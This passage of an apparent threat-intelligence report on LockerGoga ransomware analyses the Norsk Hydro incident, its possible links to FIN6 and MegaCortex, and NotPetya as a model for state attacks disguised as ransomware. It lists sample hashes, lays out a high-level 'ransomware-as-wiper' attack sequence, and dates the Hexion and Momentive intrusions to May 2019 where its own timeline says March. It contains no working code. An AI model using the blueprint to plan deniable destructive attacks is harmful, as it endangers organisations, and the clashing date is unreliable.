\ninternal candidate.28 Although \na review of the announce-\nment indicates the change in \nleadership would be effective \nseveral months later, the tim-\ning is nonetheless suspicious. \nOne possibility is an attacker \ncould view the announcement \nas indicating a shakeup of \ninternal leadership (oblivious \nto the future change-over date) \nand thus an attack coinciding \nwith the announcement could \ntake advantage of perceived \nunsettled communications \nand unclear leadership to max-\nimize disruption.\n\nReporting in the summer of \n2019 revealed additional insti-\ntutions were also targeted by \nthe same entity responsible \nfor the Hydro incident.29 As \n\nPOSSIBLE ADDITIONAL \nVICTIMS AND WIDER \nEVENT TARGETING\n\nA D D I T I O N A L  D E T A I L S  E M E R G E D  O V E R  T H E \nC O U R S E  O F  2 0 1 9  C O N C E R N I N G  T H E  H Y D R O \nE V E N T  T H A T  C A S T  F U R T H E R  U N C E R T A I N T Y \nO N  E V E N T S . \n\n14\n\n\n\nSecond, if all the entities involved were targeted by a group utilizing the same version of Locker-\nGoga, the potential for economic disruption within Norway (or any similarly-sized economy) would \nbe quite significant.\n\nBased on this information, the LockerGoga variant deployed at Norsk Hydro, and potentially also \ndeployed against other companies in Norway, looks very suspicious. The capability to render vic-\ntim networks functionally unusable means the possibility for cascading economic shock is high. \nExecuted in multiple commercial environments, industrial or otherwise, such a ransomware inci-\ndent could grind an economy to a halt provided it impacted a sufficient number of organizations. \nIn the case of Norway specifically, where a large part of economic activity (especially in the form \nof exports) is tied to extractive and manufacturing industries represented by a relatively small \nnumber of firms,32 disruption at only a few of these entities could result in profound economic \nconsequences.\n\nThe Norsk Hydro-associated LockerGoga variant, if also targeting additional entities in the Norwe-\ngian economy, evolves from a critical concern for a single company to an item of near-existential \nrisk for an entire country. Absent firm details on additional, potential victims of the disruptive \nLockerGoga variant make a definitive assessment impossible. Yet the possibility of essentially \ncrippling a country through perceived criminal tools while avoiding collateral and unintended dam-\nage, as with NotPetya, represents a profound learning opportunity for malicious actors.\n\nTwo U.S. chemical companies also were identified as LockerGoga victims just prior to the events \nat Hydro: Hexion and Momentive.33 The intrusions at these chemical companies appeared to iden-\ntify a theme in LockerGoga events, with a focus on various industrial enterprises. While public \ndisclosure of events at Hexion and Momentive occurred after the Hydro incident became known, \nall evidence and reporting indicate the two chemical companies were affected prior to Hydro \nbetween 9 and 12 May 2019. Furthermore, the malware samples most likely associated with these \ncompanies feature the same characteristics as the earlier Altran event, and do not include the \nadditional disruptive features identified at Hydro. As a result, these events appear to be noticeably \ndifferent from the Hydro incident.\n\nTable 3: LockerGoga Samples Possibly Associated with U.S. Chemical Company Events\n\nSHA256 SIZE COMPILE \nTIME\n\nFIRST \nOBSERVED \nCOUNTRY\n\nFILE \nNAME SIGNED SIGNER POSSIBLE \n\nEVENT\nFUNCTION-\n\nALITY\n\n7BCD69B3085126F7E-\n97406889F78AB74E87230C11812B-\n79406D723A80C08DD26\n\n1.19 MB 3/9/2019 \n17:50 NL ZZBDRIMP ALISA SECTI-\n\nGO\n\nHEXION OR \nMOMEN-\n\nTIVE\n\nENCRYPT \nONLY\n\nBA15C27F26265F4B063B65654E9D-\n7C248D0D651919FAFB68CB-\n4765D1E057F93F\n\n1.19 MB 3/9/2019 \n17:48 CA IMTVKN-\n\nQQ ALISA SECTI-\nGO\n\nHEXION OR \nMOMEN-\n\nTIVE\n\nENCRYPT \nONLY\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n15\n\n\n\nA P P R O X I M A T E L Y  O N E  M O N T H \nA F T E R  T H E  H Y D R O  E V E N T , \nI N D I C A T I O N S  E M E R G E D  T H A T \nL O C K E R G O G A  I N T R U S I O N S \nM I G H T  B E  T I E D  T O  A  S I N G L E \nE N T I T Y ,  F I R E E Y E - D E S I G N A T -\nE D  F I N 6 ,  A L S O  R E S P O N S I B L E \nF O R  S O M E  R Y U K  R A N S O M W A R E \nE V E N T S . 3 4 \n\nAs noted in public reporting, this link appeared \nout of place because prior FIN6 activity exclu-\nsively focused on payment card theft and \nrelated operations.35\n\nExamination indicates the link to FIN6 appears \nto be a replication or extension of previously cit-\ned work surrounding criminal activity deploying \n\nLockerGoga and Ryuk by the French CERT.36 \nThe French CERT reporting mirrors subsequent \nanalysis from FireEye in April 2019, demon-\nstrating similar infection and lateral movement \nbehaviors. Most critically for this analysis, both \nreports also exclusively cover LockerGoga vari-\nants performing encryption-only operations, \ninstead of the more disruptive variant at Hydro.\n\nInitial access techniques described in both \nreports focused on external service compro-\nmise or brute force access of remote access \nmechanisms. Ensuing activity focused on the \nuse of commercial and publicly available tools \nfor lateral movement, which may align with the \nHydro event. These reports also emphasize \nthe use of scripts and PSExec for ransomware \ndistribution as opposed to the possibility of \nAD-related malicious GPO creation. \n\nBased on available data and analysis, it is possible that non-Hydro LockerGoga incidents are aligned \nwith changes in FIN6 activity as publicly reported by FireEye and earlier indicated by the French \nCERT. However, available contextual information on the Hydro incident, such as initial access via \nhighly targeted phishing and full AD compromise for likely distribution, indicate a separate entity \nwas almost certainly involved in the more disruptive event.\n\nFigure 5: Comparing FIN6 and Norsk Hydro Event\n\nNORSK HYDRO, \nLOCKERGOGA, AND FIN6\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nInitial access via \ncompromised customer \ncommunications\n\nCompromise of active \ndirectory to distribute \nmalware\n\nIndeterminate mechanism \nfor ransomware execution\n\nBrute-force access to \nnetworks via external \nservices\n\nUse of commercial/ \npublic tools for lateral \nmovement\n\nPSExec and batch files for \nransomware spread and \nexecution\n\nFIN6-Associated \nRansomware \n\nEvents\n\nNorsk \nHydro Event\n\n16\n\n\n\n5 JAN 2019 \nFirst Identified \n\nLockerGoga \nSample\n\n9-12 MAR 2019 \nHexion and \nMomentive \n\nEvents\n\n24 JAN 2019 \nAltran Event\n\n19 MAR 2019 \nNorsk Hydro \n\nIncident\n\n24-26 APR 2019 \nPossible Aebi \n\nSchmidt Event\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nLOCKERGOGA SINCE NORSK HYDRO\n\nFollowing the Norsk Hydro event, LockerGoga seemed to disap-\npear. While several security companies claimed they responded \nto multiple LockerGoga incidents around the time of the Norsk \nHydro event,37 no public reporting emerged providing addition-\nal information around these claims. While additional, unrelated \nLockerGoga events in conjunction with Norsk Hydro are certain-\nly possible (i.e., outside of the possible coordinated economic \ndisruption scenario discussed previously), it is equally probable \nthat the events in question mirrored the ransomware-specific \nactivity at Hexion and Momentive, and not the more disruptive \nvariant deployed at Hydro.\n\nOne entity that may have suffered a ransomware event at the \nhands of LockerGoga following Hydro is the Swiss-based man-\nufacturing company Aebi Schmidt. This company suffered a \nransomware event in late April 2019 that some sources linked to \nLockerGoga, but no compelling public evidence ever emerged \nto tie the events together.38 \n\nFigure 6: Timeline of Known LockerGoga Activity\n\n17\n\n\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nLockerGoga featured an effective lifespan of only three or four months. The ransomware family \nemerged in January 2019 with the Altran event then largely disappeared after the Norsk Hydro \nevent in March 2019. Additional samples of LockerGoga have appeared in various repositories, but \nin all cases seem to be researcher modifications to existing samples and do not appear linked to \nany publicly known ransomware incident. While ransomware families are quite fluid, their function \nas monetizing instruments mean they typically persist for longer than a few months. Looking \nat LockerGoga specifically, there is an easily-observable development lifecycle and versioning \nreflected in the binaries from pre-Altran through Norsk Hydro, shown in Table 4.\n\nTable 4: Observed LockerGoga Versions\n\nLOCKERGOGA VERSION NUMBER FIRST OBSERVED COMPILATION TIME FUNCTION\n\n0.9.9.0 05 JANUARY 2019 ENCRYPT ONLY\n\n1.0.1.0 16 JANUARY 2019 ENCRYPT ONLY\n\n1.0.2.0 16 JANUARY 2019 ENCRYPT ONLY\n\n1.1.0.0 23 JANUARY 2019 ENCRYPT ONLY\n\n1.1.1.0 25 JANUARY 2019 ENCRYPT ONLY\n\n1.2.0.0 03 FEBRUARY 2019 ENCRYPT ONLY\n\n1.3.2.0 02 MARCH 2019 ENCRYPT ONLY\n\n1.4.4.0 09 MARCH 2019 ENCRYPT ONLY\n\n1.4.4.1 10 MARCH 2019 ENCRYPT ONLY\n\n1.5.1.0 18 MARCH 2019 ENCRYPT, CHANGE PASSWORDS, DISABLE \nNETWORK ADAPTERS, LOGOFF USERS\n\nLockerGoga featured a very active development period from January through March 2019. Fol-\nlowing the Norsk Hydro incident, the malware family appeared to be abandoned. The dramatic \nchange in functionality from the 1.4 versions to the 1.5 variant at Hydro indicated a significant shift \nin intention and capability after several months of the malware focusing exclusively on encryption \noperations.\n\nFrom an economic and resource-focused view, a criminal or related entity investing development \nresources into designing and deploying a new type of ransomware would presumably desire to \ndraw as much value from that malware as possible. This is observed in the long lifecycles in \nalmost every major ransomware variant, as described in Appendix B of this document. \n\n18\n\n\n\nWhile responses at Momentive and Hexion to likely LockerGoga variant infections are not publicly \nknown, all public indications suggest that neither Altran nor Hydro paid the ransom associat-\ned with their events. In this respect, LockerGoga would appear to have a poor success rate in \ngenerating funds, and since it disappeared so suddenly appears inefficient from a monetization \nperspective. Given all this information, and the sudden shift from versions performing fairly non-\ndescript network encryption operations to the more disruptive malware involved at Hydro, the \nevolution of available LockerGoga samples indicates a tool that was potentially modified for one-\ntime, spectacular disruptive purposes before being retired.\n\nLOCKERGOGA AND MEGACORTEX\n\nO N E  P O S S I B I L I T Y  B E H I N D  L O C K E R G O G A ’ S  S U D D E N  R I S E  A N D \nE Q U A L L Y  S U D D E N  D I S A P P E A R A N C E  I S  T H A T  T H E  E N T I T Y  B E H I N D \nT H E  M A L W A R E  S I M P L Y  E V O L V E D  O R  M O D I F I E D  C A P A B I L I T I E S , \nE S P E C I A L L Y  A F T E R  A  V E R Y  H I G H - P R O F I L E  E V E N T  S U C H  A S  N O R S K \nH Y D R O . \n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nThis theory is supported by media reporting in \nMay 2019 that identified unusual links between \nLockerGoga and a newly-emerged ransomware \nfamily called MegaCortex.39 Links between the \ntwo focus on support items, specifically simi-\nlar batch files for security process and related \nprocess kill actions, and a shared IP address \nidentified in compromises. As noted in the \npublic technical report by researchers from \nSophos, the IP address in question is associat-\ned with multiple, unspecified malware activity \nand is not a definitive indicator of links given \nwidespread use.40 Other observables, such as \nboth malware families using Boost libraries \n(although MegaCortex appears to only use \nBoost for inter-process communication, while \nLockerGoga relies on Boost for additional file \n\nmodification purposes) and parent-child pro-\ncess behavior can be seen as coincidences, \nand are noted as such by Sophos.\n\nWhile there are superficial similarities between \nthe malware families, and they have been refer-\nenced together in public alerts on ransomware \nactivity,41 available evidence supports only a \ntangential connection at best between the two. \nGiven “core” LockerGoga functionality emerged \nin January 2019 while MegaCortex first came \nto light in May 2019, it is very possible that \nMegaCortex’s design is based off review and \nanalysis of LockerGoga functionality following \nthe Altran event. Additionally, MegaCortex has \nnot displayed the disruptive capabilities asso-\nciated with the LockerGoga variant involved in \nthe Hydro incident.\n\n19\n\n\n\nOne final consideration on this topic concerns \na new variant of MegaCortex from summer \n2019,42 and a further variant of this malware \ncalled “EKANS” from December 2019.43 In both \ncases, observed malware featured an exten-\nsive list of processes to terminate as part of \nthe encryption process. While most of the \nprocesses identified in the MegaCortex vari-\nant were security products, a subset related to \nindustrial control system (ICS) software exist-\ned within the binary. This subset was ported \ntogether with the later EKANS variant. While \nsome reporting around EKANS highlighted this \nevent as a possible state-sponsored disruptive \nevent,44 all available evidence and malware \nfunctionality strongly suggest otherwise.45\n\nWhile the two malware variants target process-\nes for termination, the most likely explanation \nfor doing so is to free files “locked” by them \nto further spread encryption of vital resources. \nThe targeted processes focus on data storage, \nanalysis platforms, and licensing servers, and \nappear to support this conclusion. While the \nransomware encrypts significant portions of \nthe victim machine, it does not perform disrup-\ntive actions like password changes and network \ncard disabling associated with LockerGoga, or \nthe filesystem encryption activity from NotPe-\ntya (discussed in detail below). These items \nappear to represent an evolution in likely crim-\ninal ransomware development, as opposed to \na potential disruptive capability masquerading \nas such.\n\n20\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n\n\nDISRUPTIVE \nCAPABILITY\nTypically, IT-focused destructive activity centers on \nwiper malware. One of the most obvious examples \nof such malware is the Shamoon incident impacting \nthe IT network of Saudi Aramco in 2012.46 \n\nR A N S O M WA R E A S\n\nMultiple rounds of disruptive malware have \nfollowed,47 from follow-on Shamoon variants \nto the use of KillDisk in the 2015 Ukraine pow-\ner event.48 Yet in all these cases, the intention \nof the malware involved is clear based on \ntechnical analysis: to irrevocably wipe and \nrender IT systems unusable within the victim \nenvironment. These events can be clearly dis-\npositioned as the actions of an entity motivated \nby reasons other than financial gain, whether \nstate-sponsored geopolitical activity or poten-\ntially, although never proven in actual events, \na politically motivated independent actor (e.g., \n“hacktivist”). The fingerprints for a wiper make \nassessing adversary intent, and given other \nobservables, adversary identity somewhat \nclear.\n\nMore discrete tools and capabilities exist to \ndeliver an equivalent impact while keeping \n\noverall matters of intent, attribution, and per-\nceived purpose murky. A ransomware event \nthat encrypts an entire network and disables \nkey functionality, provided the encryption \nschema is sound and not vulnerable to brute \nforce or other attacks, delivers essentially \nthe same impact as a network-wide wiper, in \nthat systems are unusable and near impossi-\nble to recover. Such an event blends into an \nincreasingly murky market of multiple actors \ndeploying ransomware variants for perceived \ncriminal gain. Even if the encryption mecha-\nnism proves faulty (in terms of file recovery), \nan actor attempting to “hide” a disruptive attack \nthrough ransomware can still blend in with sim-\nilarly botched encryption implementations to \nmake their irrecoverable file encryption appear \na mistake as opposed to a deliberate action at \nmaking systems inaccessible.49\n\n21\n\n\n\nUtilize or modify \nransomware variant \n\nwith strong \nencryption \nmechanism\n\nAdd additional disruptive \nimpacts to inhibit \n\nrecovery, maximize \ndislocation\n\nDeploy in targeted fashion \nto avoid over-spread, \n\ncollateral damage\n\nIntention of never disclosing \nkey or responding to \nransom negotiations \n\nperpetuates \ndisruption\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nFigure 7: Ransomware-as-Disruptor Possible Attack Sequence\n\nNOTPETYA AS \nRANSOMWARE-LIKE \nDESTRUCTIVE ATTACK\n\nNotPetya emerged as an especially virulent, widespread \nsystem encryption event months after WannaCry. Closer \nexamination of NotPetya – from its initial delivery mech-\nanism through its specific actions on victim systems \n– revealed a murkier picture indicating the malware was \ndesigned not as a tool for monetization, but rather a mech-\nanism to render victim systems unusable.\n\nThe disruptive NotPetya worm has its origins in a ransom-\nware variant that emerged in 2016 called Petya. Unlike \nother ransomware variants, Petya overwrites the victim \nmachine’s Master Boot Record (MBR) and encrypts the \nMaster File Table (MFT), making the system functionally \nunusable without decryption.50 While a concerning devel-\nopment in ransomware, actual implementation was faulty \nand led researchers to successfully identify ways to recov-\ner impacted systems without paying the ransom.51\n\n22\n\n\n\nNOTPETYA LESSONS LEARNED \nAND ATTACKER EVOLUTION\n\nA new strain of Petya, subsequently referred \nto as “NotPetya” given dramatically different \nintentions, emerged on 27 June 2017 and rap-\nidly spread worldwide.52 As noted previously, \nNotPetya appeared to start as a targeted attack \non Ukrainian organizations given initial infec-\ntion via a malicious update to Ukraine-specific \naccounting software. Using a combination of \nboth the MS17-010 vulnerability (and accom-\npanying EternalBlue exploit) and dynamic \ncredential capture and re-use,53 it spread glob-\nally quickly beyond its likely intended area of \noperations. As a result, NotPetya impacted \nentities likely beyond adversary intent – includ-\ning significant impacts on Russian enterprises \nsuch as Rosneft, Evraz, and Sberbank.54 Given \nsubsequent attribution by multiple entities that \nthe NotPetya attack originated with Russian \nstate interests,55 it would appear the malware \nspread almost too effectively resulting in \ndomestic damage for its perpetrators.\n\nYet this last point underscores several interest-\ning observations about NotPetya’s alterations \nfrom its predecessor. In addition to incorpo-\nrating virulent self-propagating mechanisms, \nNotPetya’s encryption routine simply does not \nallow for recovery. As noted by researchers at \nKaspersky and Matt Suiche of Comae, Not-\nPetya generates the infection victim identifier \n– critical for determining the right decryption \nkey – by creating random data.56 Attackers \nwould never be able to derive or recover the \ndecryption key to unlock an infected system (or \nnetwork), even if payment is made. NotPetya \neffectively “wipes” systems due to the com-\nbination of MBR/MFT attack (rendering the \nsystem inaccessible) and is intended to be a \none-way encryption routine with no recovery. \n\nATTACKERS ESSENTIALLY LOCKED \nSYSTEMS, THEN THREW AWAY THE \nKEY.\n\nDeploying ransomware (or ransomware-like functionality) without ever intending victim recovery \npresents a case where attackers can muddy reporting and potentially deflect blame while still exe-\ncuting devastating attacks. As noted by Matt Suiche, “The fact of pretending to be a ransomware \nwhile being in fact a nation state attack — especially since WannaCry proved that widely spread \nransomware are [not] financially profitable — is in our opinion a very subtle way from the attacker \nto control the narrative of the attack.”57\n\nAt least initially, and especially emerging relatively soon after the global WannaCry outbreak, the \ndesired narrative of highly virulent criminal ransomware seemed to hold. Technical analysis such \nas that mentioned above began to poke holes in this initial understanding with ultimate public \nattribution by several governments that NotPetya was a Russian destructive attack focused on \nUkraine, ultimately settling nearly all reasonable debate.\n\n23\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n\n\nYet there were several problems with how NotPetya worked, especially since the desired story \nfailed to hold over time. What appeared to be a Ukraine-centric event given the focus on the \nMEDoc accounting software as initial infection vector quickly became a globally disruptive phe-\nnomenon.58 That the malware spread to key Russian companies was probably the least significant \nconcern for a Russian-sponsored disruptive event, as cascading disruptions in Europe and the \nU.S. could have led to some degree of retaliation – a possibility since echoed in public comments \nby NATO Secretary General Jens Stoltenberg.59\n\nNotPetya appeared to have the following failings:\n\n1.\t The encryption routine and related processes destroyed any plausibility that the event \ncould be construed as criminally motivated ransomware.\n\n2.\t The attack was too effective in spreading, resulting in significant impacts outside the \nintended target (Ukraine), but hitting domestic (Russian) organizations and entities that \nmight retaliate (U.S., Europe) as well.\n\nThe idea presented by NotPetya would be quite enticing to an adversary; the ability to execute \na potentially crippling disruptive attack against an entity while severely undermining any ability \nto publicly identify the true responsible party. With adjustments in disabling methodology and \nspreading mechanisms, a more effective and controlled attack could be possible.\n\nThe evolution of ransomware after the Not-\nPetya event provided many of the elements \nnecessary to meet these goals. From a prop-\nagation standpoint, ransomware authors and \nthose deploying such malware in many cases \nshifted network compromise from the use of \nself-spreading tools to more deliberate, inter-\nactive compromise of victim environments. \nThis trend is observed in the “big game \nhunting” type of intrusions associated with \nRyuk, LockerGoga, and MegaCortex (among \nothers), where attackers compromise the \nnetwork then use the resulting access to \nseed ransomware for future coordinated \nexecution.60 The shift from per-host victim \nencryption to per-network encryption sche-\nmas where entire organizations are impacted \nprovides a means to achieve widespread dis-\nruption without having to “fake” the existence \nof a decryption mechanism.\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n24\n\n\n\nFigure 8: NotPetya Failures and Limitations\n\nAn attacker wishing to replicate the idea of \nNotPetya, but more effectively with greater \ncontrol, could therefore breach the networks \nof organizations of interest in advance, seed \nthese networks with ransomware that is some-\nwhat more disruptive than normal (but not \nexceptionally so), and then simply “throw away \nthe key” after execution. If cryptographically \nsound methods are used to deliver the attack, \nthe possibility of recovery outside of complete \nsystem rebuild is very small. Given previous \nanalysis and cited research above, the scenario \nof a more controlled, better implemented Not-\nPetya begins to look close to something like \nthe Norsk Hydro event and its unique variant of \nLockerGoga ransomware.\n\nAlthough impossible to prove, an evaluation \nof publicly available data and related malware \nsamples shows Norsk Hydro to be unique-\nly suited to follow a targeted and effective \nNotPetya model. When combined with other \nobservations, such as potentially more wide-\nspread targeting of Norwegian companies, the \nsituation becomes a part of a reasonably con-\ntained but locally widespread disruptive event. \nAvailable evidence cannot effectively disposi-\ntion events toward either criminal activity or \nstate-sponsored disruption, but given observa-\ntions and the analysis above, the Hydro event \nat minimum provides an interesting and wor-\nryingly effective blueprint to state-sponsored \nentities on how to leverage seemingly criminal \nactivity for disruptive purposes.\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nENCRYPTION BEHAVIOR\nNotPetya easily identified as a non-functioning ransomware sample\n\nNo plausible deniability due to no monetization capacity\n\nMALWARE PROPAGATION\nNotPetya almost certainly spread too far:\n\n> Impacted Russian entities\n> Spread to U.S., NATO members\n\nGreater control and direction needed to avoid collateral, unintended damage\n\nMESSAGING\nIntention ambiguity between criminal or wiper failed due to encryption implementation\n\nSpread beyond Ukraine, limited focus as a Ukraine-specific event\n\n25\n\n\n\n Widely targeted and quickly revealed as some-\nthing other than criminal malware, it caused \ngreat damage but failed to take advantage \nof potential misdirection and misinformation \nitems tied to its masquerade as ransomware. \nWith some modifications, which coincidentally \nadhere closely to the evolution of the overall \ncriminal ransomware environment, this activ-\nity can rapidly shift into a targeted, effective \ndisruption mechanism. We typically examine \ncyber weapons through the lens of very com-\nplex, highly targeted examples such as Stuxnet. \nMalware is a tool to obtain an objective, and \nwhen combined with concerns over attribu-\ntion (and potential retaliation), an attack that is \nminimally complex while avoiding assignment \nof blame can be quite effective in achieving an \nattacker’s goals.\n\nRepurposed ransomware offers an avenue to \nmeet these objectives. The degree of alterations \ncan be relatively minimal, requiring alterations \nto encrypt or disable systems (such as Not-\nPetya’s MBR/MFT capability, or the Hydro \nLockerGoga variant’s forced after disabling \nnetwork connectivity and changing credentials) \nto achieve disruptive goals. Another key point \nis access to software, especially source code, \nto facilitate modification while adhering closely \nto the profile of known, existing ransomware \nfamilies. The relationships between criminal \nelements and state-sponsored cyber entities \nare close in many environments,61 facilitating \nknowledge and capability transfer from crimi-\nnal spaces for repurposing by state interests.\n\nREPURPOSED \nRANSOMWARE\nWhile NotPetya was certainly disruptive, it also \nrepresented a very blunt tool. \n\nI N F O R M AT I O N O P E R AT I O N S \nA N D D I S R U P T I V E I M P L I C AT I O N S O F\n\n26\n\n\n\nDENIABLE OPERATIONS BY \nMIMICKING CRIMINAL ACTIVITY\n\nThe field of cyberwarfare remains immature with still-fluid norms. As campaigns become more \nharmful and more brazen, governments are increasingly willing to publicly condemn attackers and \nimpose a degree of cost on entities. Most consequences focus on legal remedies such as indict-\nments or sanctions.62 While legal approaches seldom result in actual arrests, although there are \nexceptions, the increasing willingness to issue significant punishments in terms of commercial \nrestrictions or access to markets through sanctions has noticeable costs. Except entities com-\npletely divorced from the international system, like DPRK, sanctions have meaning. Avoiding them \nis preferential to having to deal with their consequences.\n\nFor disruptive operations outside of established or recognized conflict zones (such as Ukraine \nor the Gulf region), there is significant value in being able to generate enough uncertainty to \navoid legalistic attribution. Repurposing already-disruptive criminal malware for disruptive means \nprovides a simple and cheap avenue for doing so. Combined with institutional and cultural con-\nsiderations around reporting and identification (discussed below), a state-sponsored or directed \nentity could launch an attack as effective as any of the Shamoon events while hiding behind the \nfaçade of possible criminal ransomware activity.\n\nFigure 9: Ransomware-as-Wiper Requirements Aside from avoiding obvious international \ncriticism for the use of cyberattacks to dis-\nrupt civilian or commercial infrastructure, \nthis approach also broadens the scope of \nareas where attacks can be used with rela-\ntive impunity. For example, the various rounds \nof Russian-linked disruptive cyber activity in \nUkraine, from two electric sector events to \nmultiple additional campaigns, has resulted \nin no noticeable consequence to Russia.63 \nAlthough better resourced and arguably more \nstrategically valuable, the same can be said for \nmultiple rounds of wiper malware impacting \nthe Kingdom of Saudi Arabia, likely from Iranian \nentities, since the original Shamoon event. By \nproviding a means to not only obfuscate attri-\nbution but to redirect blame to likely criminal \nelements, a ransomware-as-disruptor pattern \nis ideally placed to enable actions in locations \nsuch as the U.S. or Europe while avoiding likely \nconsequences.\n\nEncryption \nmechanism must \n\nbe sound, plausible\n\nImplementation \nmeans decryption and \nrecovery is theoretically \n\npossible, even if \nunintended\n\nIncorporate      \nadditional disruptive \ncapabilities (account \npassword changes, \n\nMBR/MFT lock, etc.) to \nensure network     \n\nlockdown\n \n\nControl over \npropagation or \n\ntargeting specificity to \navoid unintended \n\nconsequences\n\nRansomware-\nas-Wiper \n\nRequirement\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n27\n\n\n\nVICTIM REPORTING CONCERNS \nWITH POSSIBLE STATE-SPONSORED \nINVOLVEMENT\n\nWhen focused on civilian, non-government networks, the capabilities for deniability and hiding \nbehind perceived criminal actions become more robust. Several items enter consideration at this \nstage, including continuing tension between private or commercial sector network defense and \ngovernment interest in having access to incident data for investigation. Organizations may publicly \ndeclare willingness to work with governmental partners, but when such cooperation comes with \npotential risks of leaks, disclosures, or impacts to reputation (or to perception in potentially import-\nant markets, such as those of the likely perpetrators of intrusion activity), the cooperation may be \nvery shallow or effectively non-existent.\n\nIn a disruptive cyber event, additional perverse incentives exist that provide further room for \nmalicious actors to hide their activities. A disruptive event by its very nature entails widespread \ndislocation of everyday business practices. Recovery operations take primary importance as \nimpacted firms lose thousands (or millions) of dollars for each hour systems are unavailable. Given \nthe trend toward network-wide, simultaneous encryption events in the criminal market, mirrored \nactivity by state-sponsored entities mean similar challenges in attempting to perform meticulous, \ndetailed forensic analysis and evidence recovery when the primary goal of the business is service \nrestoration. Malicious behaviors and potential subtle differences between known criminal entities \nand other parties, can become masked or destroyed as systems are wiped, rebuilt, and restored \nas quickly as possible.\n\n28\n\n\n\nThis is a common tension in computer network \ndefense operations and is not unique. The impli-\ncations of having, acknowledging, or admitting \nto a disruptive event emerging from state-di-\nrected or related activity can be turbulent. \nOne especially interesting legal development \nin the aftermath of NotPetya concerned cyber \ninsurance claims. While recovering from this \ndisruptive event, pharmaceutical giant Merck, \nfood products manufacturer Mondelez, and \nother entities attempted to recoup losses via \ninsurance policies which included coverage for \ncyber events. All claims were denied due to “act \nof war” provisions in the policies exempting \nsuch actions from coverage.64 \n\nIn NotPetya-related cases, information enabled \ninsurance companies to invoke war exemp-\ntions in policies derived from government \nreporting and condemnation of the event as a \nRussia-directed effort. As explained previous-\nly, the NotPetya attack was almost certainly \nmore widespread and damaging than intended, \nthus producing conditions prompting a firm, \nunequivocal response from impacted govern-\nments (even if only of the “name and shame” \nvariety). More targeted events, such as a theo-\nretical Norsk Hydro scenario where a company \nis impacted by a more deliberate event that \nalso appears to be actual ransomware, avoids \nthe massive impacts prompting government \nresponse. Given the limited scope of the event, \nany emerging information sharing would have \nto come from the impacted party itself or \nthose responding to events on their behalf (all \nof whom are likely under strict nondisclosure \nagreements). In this environment, if a company \nhas even the slightest thought that circum-\nstances were brought about by a possible \nstate-sponsored attack, financial incentives \nwould argue for sharing as little technical and \n\nrelated information as possible that could be \nused to make such a case of state-sponsored \nattribution publicly. In observed NotPetya \ninsurance claims, the potential costs to victims \nranged from the hundreds of millions to billions \nof dollars.\n\nWhile available reporting from LockerGoga \nand other ransomware events in Europe stress \nsignificant law enforcement involvement in \nattempting to identify perpetrators behind inci-\ndents, an ecosystem with financial incentives \neffectively penalizing companies for sharing \ninformation about their disruptions will lead to \nsuboptimal results. When taken into consider-\nation with existing concerns, such as the threat \nof lawsuits for negligence, failure to protect \nshareholder value, or damages from impact-\ned customers or clients,65 organizations are \nstrongly incentivized to share as little informa-\ntion as possible.\n\nWithin this landscape, the necessary informa-\ntion to identify what appears at first glance \nto be another ransomware event is denied to \nthose able to make such judgments. This set of \nperverse incentives due to financial penalties \nor losses means a potential state-sponsored \nor directed actor has significant space to oper-\nate directly in view of government authorities \n(or commercial security vendors) charged \nwith safeguarding entities under their control \nor protection. Without significant changes in \nregulation, legal risk, and insurance language, \nprivate sector entities (who also control large \namounts of critical infrastructure, to say nothing \nof overwhelming economic footprints) facing a \ntargeted “wiper-as-ransomware” will have little \nreason to be cooperative or forthcoming with \nanything other than superficially useful data. \nThe result is a poorer, less secure landscape \nfor all organizations.\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n29\n\n\n\nCONCLUSIONS\nT H E  N O R S K  H Y D R O  R A N S O M W A R E  E V E N T \nA P P E A R S  A T  O N C E  B O T H  S T R A I G H T F O R -\nW A R D  A N D  I N C R E D I B L Y  C U R I O U S . \n\nWhile insufficient evidence \nexists to definitively determine \nthat the Hydro event was tru-\nly a disruptive attack instead \nof another (if spectacular) \nransomware event, details \nshowcase items that forecast \npotential developments in the \nfield of cyberwarfare. \n\nThe combination of a modifi-\ncation of existing ransomware, \nincreased disruptive impacts \nfrom such malware, and tar-\ngeting and timing specification \nprovide a blueprint for how a \n\nstate-directed adversary could \nutilize criminal tooling to exe-\ncute deniable, but effective, \ndisruptive operations.\n\nWhile ransomware rages on \nthrough new families and an \nincreasing array of victims, the \nsheer volume of such activi-\nty provides ample space for \nentities not focused on mone-\ntary gain to operate with more \nnefarious intentions. NotPetya \nmay have served as an ini-\ntial example of such activity, \nbut a combination of poorly \n\nimplemented encryption func-\ntionality and over-zealous \npropagation made this event \nrelatively easy to attribute to \nits state-based roots. \n\nAs ransomware has evolved \nfrom wildly propagating \nhost-specific infections to more \ndeliberate network compro-\nmise, malicious state-directed \nentities now have a new and \nvaluable option for future \ndisruptive operations. The \ncombination of efficacy \n(when properly implemented), \ndeniability (due to continued \nwidespread criminal activity), \nand specificity (as self-prop-\nagation gives way to precise \nnetwork compromise) enables \nselective and controlled \ntargeting of entities for dis-\nruption and effective IT-based \ndestruction.\n\n30\n\n\n\nWhile examples beyond NotPetya remain speculative, \ncases such as Norsk Hydro provide possibilities that \nadversaries can (and will) learn from, meaning defenders \nand policymakers must similarly pay close attention to \nsuch events. Current frameworks for responding to dis-\nruptive intrusion events that appear to be merely “criminal” \npush most responsibility to victims (and their incident \nresponse retainer vendors). Subsequent investigation \nunder a law enforcement aegis means state-sponsored \nand directed elements have significant space, both tech-\nnically and bureaucratically, to operate unimpeded given \nslow timelines, inadequate evidence collection, and disin-\ncentives towards unrestricted sharing of vital data.\n\nTo counter the risk of adversaries becoming savvier and \nthe possibilities of masquerading as criminal entities for \ndestructive purposes, a rethink is required in how net-\nwork defense, information sharing, and cost sharing are \nconducted. First, defenders must move from a position 